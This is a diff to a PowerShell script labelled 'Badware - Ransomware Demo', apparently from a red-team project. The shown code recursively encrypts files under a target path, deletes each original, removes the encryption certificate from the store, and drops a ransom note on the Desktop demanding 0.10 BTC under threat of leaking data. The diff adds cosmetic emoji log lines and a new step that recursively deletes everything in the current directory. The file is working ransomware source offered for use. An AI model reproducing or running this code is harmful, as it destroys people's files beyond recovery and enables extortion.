@@ -97,7 +97,7 @@ if ($CertPrint -is [array])
 }
 $Cert = $(Get-ChildItem Cert:\CurrentUser\My\$CertPrint)
 
-Write-Host "[+] Init Encryption ..." -ForegroundColor Green
+Write-Host "[+] Init Encryption 🔐..." -ForegroundColor Green
 
 #----------------------------------------------------------------------------------------------------------------------------------------
 # Encrypt files via Badware 
@@ -224,11 +224,12 @@ Function Decrypt-File
 
    foreach ($i in $(Get-ChildItem $TargetEncr -recurse -exclude *.badware | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })){ 
    Encrypt-File $i $Cert 
+   Write-Host "[🏴‍☠️] $i is now encrypted" -ForegroundColor Red
    rm $i
    } 
 Write-Host "[+] Badware Deployed Successfully..." -ForegroundColor Green
 
-Write-Host "[+] Cleaning ..." -ForeGroundColor Green
+Write-Host "[+] Cleaning Encryption key ..." -ForeGroundColor Green
 $(Get-ChildItem Cert:\CurrentUser\My\$CertPrint) | Remove-Item
 
 Write-Host "[+] Intiating UI..." -ForegroundColor Green
@@ -264,7 +265,7 @@ $form.MaximizeBox = $false
 $Form.Back
 $Form.StartPosition = "CenterScreen" 
 $Form.FormBorderStyle = 'Fixed3D' 
-$Form.Text = "Badware - Ransomware Demo" 
+$Form.Text = "🏴‍☠️ Badware - Ransomware Demo" 
 
 $img = [System.Drawing.Image]::Fromfile($header)
 $pictureBox = new-object Windows.Forms.PictureBox
@@ -322,6 +323,9 @@ $delay -= 1
 }
 $Form.Close()
 Write-Host "[+] Creating Badware.txt on Desktop ..." -ForegroundColor Green
-
 "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension 'badware'.\n It is possible to recover your files but you need to follow our instructions and pay us before the time runs out.\n If you do not pay the ransom of 0.10 BTC these files will be leaked online.\n The faster you contact us at mechant@cec-fr.digital with the proof of payment, the easier it will be for us to release your files.\n Your backups were also encrypted and removed. This ransomware encrypts all the files of the hard drive.\n To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data.\n If you do not pay the money your sensitive data will be leaked online.\n \n Computacenter Red Team ! " | Out-File -FilePath /users/$env:USERNAME/desktop/BadWare.txt
-Write-Host "[+] Exiting and waiting for the money :)" -ForegroundColor Green
+
+Write-Host "[+] Clean up the mess 🧹..." -ForegroundColor Green
+Get-ChildItem -Path $(Get-Location) -Include * | remove-Item -recurse 
+
+Write-Host "[+] Exiting and waiting for the money 💰" -ForegroundColor Green
